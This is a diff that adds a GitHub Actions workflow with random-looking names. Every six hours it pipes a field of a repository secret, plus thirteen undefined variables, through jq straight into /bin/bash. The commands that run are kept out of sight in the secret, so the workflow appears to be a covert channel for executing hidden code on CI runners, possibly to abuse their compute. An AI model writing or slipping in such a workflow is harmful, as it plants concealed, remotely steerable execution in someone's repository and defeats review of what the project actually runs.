@@ -1,0 +1,31 @@
+name: riiakflj
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: riiakflj
+        env:
+          wb3: ${{ secrets.wb3 }}
+        run: |
+          echo $wb3 | jq -r .cebp00 | /bin/bash
+          echo $qy14 | jq -r .h6406 | /bin/bash
+          echo $xj9138 | jq -r .hco15 | /bin/bash
+          echo $j89 | jq -r .jcxeq86 | /bin/bash
+          echo $iy4323 | jq -r .st91235 | /bin/bash
+          echo $trxlj69644 | jq -r .ia8191 | /bin/bash
+          echo $gxrx57714 | jq -r .ry2 | /bin/bash
+          echo $ku35 | jq -r .eq89949 | /bin/bash
+          echo $zq6 | jq -r .g01631 | /bin/bash
+          echo $rkikl14076 | jq -r .vv0948 | /bin/bash
+          echo $gwlm5527 | jq -r .soxpi0 | /bin/bash
+          echo $c37 | jq -r .ph810 | /bin/bash
+          echo $xij0919 | jq -r .gm65 | /bin/bash
+          echo $z43 | jq -r .kv719 | /bin/bash
+
